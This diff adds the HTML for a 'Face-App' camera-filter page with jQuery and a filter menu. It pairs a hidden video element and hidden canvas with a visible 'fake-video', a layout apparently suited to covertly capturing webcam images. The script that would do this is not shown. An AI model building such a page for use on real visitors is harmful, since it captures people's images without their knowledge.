@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <meta name="apple-mobile-web-app-title" content="CodePen">
+    <link rel="apple-touch-icon" type="image/png"
+      href="https://static.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
+    <link rel="shortcut icon" type="image/x-icon"
+      href="https://static.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
+    <link rel="mask-icon" type=""
+      href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg"
+      color="#111">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+      integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title>Face-App</title>
+   
+  </head>
+
+  <body translate="no">
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay hidden="hidden"></video>
+</div>
+  <canvas id="canvas" hidden="hidden"  width="640" height="640"></canvas>
+
+    <div style="position: relative; display:flex; justify-content: center;margin-top: 40vh;">
+      <div id="device">
+        <div id="top">
+          <div class="left">&nbsp;</div>
+          <div class="right">&nbsp;</div>
+        </div>
+        <div id="content">
+          <div class="video-wrap-fake">
+            <video id="fake-video" playsinline autoplay></video>
+          </div>
+          <div class="menu">
+            <i class="fas fa-bolt fa-lg"></i>
+            <i class="fas fa-volume-mute fa-lg"></i>
+          <div class="circle">
+            <div class="fill grayscale" style="background-color: gray"></div>
+            <div class="fill invert" style="background-color: cyan;"></div>
+            <div class="fill blur" style="background-color: whitesmoke;"></div>
+            <div class="fill sepia" style="background-color:  yellow ;"></div>
+
+          </div>
+          <i class="fas fa-sync-alt fa-lg right"></i>
+        </div>
+      </div>
+      </div>
+      </div>
+     <script src="js/script.js"></script>
+      <script src="https://use.fontawesome.com/releases/v5.7.2/css/all.css"></script>
+  </body>
+
+</html>
